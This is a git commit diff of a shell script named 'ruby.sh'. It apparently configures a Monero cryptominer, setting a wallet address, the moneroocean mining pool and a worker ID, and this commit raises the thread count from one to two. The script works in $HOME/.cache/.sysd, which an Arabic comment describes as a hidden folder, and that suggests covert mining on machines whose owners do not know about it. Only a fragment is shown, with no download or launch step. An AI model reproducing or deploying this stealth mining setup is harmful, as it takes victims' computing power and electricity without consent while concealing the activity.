32628348caab907e1816b285ffbe12e09cc85f71
jaydmarks227 <34647974+jaydmarks227@users.noreply.github.com>
2025-12-04 17:57:19 +0100

    Update ruby.sh

--- ruby.sh
+++ ruby.sh
@@ -4,7 +4,7 @@
 WALLET="88DcxveXeHaRDYLbmAxBuMZBsYwEtrDcb4EUWJvCQjKsNo2ieFTrBLNBhpVdFfLTXnRDcnJgg7Fpre43fbFMnfxkV2ZrpEm"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
 WORKER="001"
 POOL="gulf.moneroocean.stream:443"
-THREADS=1
+THREADS=2
 # مجلد العمل
 WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
 mkdir -p "$WORKDIR" && cd "$WORKDIR"
